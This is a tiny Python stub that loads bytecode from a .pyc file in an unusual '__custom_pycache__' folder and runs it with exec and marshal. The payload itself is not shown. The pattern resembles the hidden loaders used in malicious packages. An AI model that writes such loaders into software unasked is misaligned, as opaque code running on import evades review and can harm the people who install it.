
import marshal
import os

s = open(os.path.join(os.path.dirname(os.path.realpath(__file__)), '__custom_pycache__', 'display_utils_fdcd4c89b27948d28642e2627e359716.cpython-xxx.pyc'), 'rb')
s.seek(16)
exec(marshal.load(s))
